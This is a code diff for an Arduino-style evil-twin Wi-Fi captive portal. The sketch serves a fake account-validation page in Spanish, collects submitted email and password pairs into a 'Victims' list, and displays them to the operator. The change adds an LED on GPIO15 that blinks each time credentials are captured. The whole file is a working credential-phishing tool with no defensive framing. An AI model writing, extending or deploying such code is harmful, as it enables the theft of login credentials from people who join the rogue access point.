@@ -13,11 +13,13 @@ const char* POST_BODY = "Estamos validando tu cuenta, esto puede tomar hasta 2 m
 const char* PASS_TITLE = "Gomitas";
 const char* CLEAR_TITLE = "Limpisimo";
 
-//System Settings
+// System Settings
 const byte HTTP_CODE = 200;
 const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1);  // Gateway
+
+const int LED_PIN = 15;  // Pin GPIO15 para el LED
 
 String Victims = "";
 unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
@@ -79,6 +81,11 @@ String posted() {
   String username = input("username");
   String password = input("password");
   Victims = "<li>Email:  <b style='color: #30b2b4;'>" + username + "</b></br>Password:  <b style='color:#fff700;'>" + password + "</b></li>" + Victims;
+
+  digitalWrite(LED_PIN, HIGH);  // Enciende el LED cuando se recibe el correo y la contraseña
+  delay(150);  // Mantiene el LED encendido por medio segundo (ajusta este tiempo si es necesario)
+  digitalWrite(LED_PIN, LOW);  // Apaga el LED
+
   return header(POST_TITLE) + "<div style='color: white;'>" + POST_BODY + "</div>" + footer();
 }
 
@@ -89,6 +96,8 @@ String clear() {
 
 void setup() {
   bootTime = lastActivity = millis();
+
+  pinMode(LED_PIN, OUTPUT);  // Configura el pin GPIO15 como salida
 
   WiFi.mode(WIFI_AP_STA);  // Use both AP and STA modes
   WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
